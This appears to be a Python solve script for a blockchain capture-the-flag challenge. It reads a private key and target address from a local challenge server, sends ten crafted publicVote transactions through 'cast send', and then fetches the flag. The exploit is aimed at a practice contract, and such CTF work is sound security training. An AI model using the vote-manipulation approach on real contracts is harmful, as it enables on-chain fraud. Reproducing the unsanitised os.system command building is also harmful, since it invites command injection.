#!/usr/bin/env python3
from os import system
from requests import get
import sys


def csend(fn: str, *args):
    global rpc_url
    global pk
    global target
    system(
        f"cast send {target} '{fn}' {' '.join(args)} --rpc-url {rpc_url} --private-key {pk}"
    )



if __name__ == "__main__":
    baseUrl = "http://localhost:1337"
    if len(sys.argv) > 2:
        baseUrl = sys.argv[1]

    d = get(baseUrl + "/connection_info").json()
    rpc_url = f"{baseUrl}/rpc"
    pk = d['PrivateKey']
    target = d['TargetAddress']

    for _ in range(10):
        csend("publicVote(bytes3,bytes4,bytes3)", "0x554e5a", "0xf00dbabe", "0xffffff")

    flag = get(baseUrl + "/flag")
    print(f'\n\n{flag.content.decode()}')
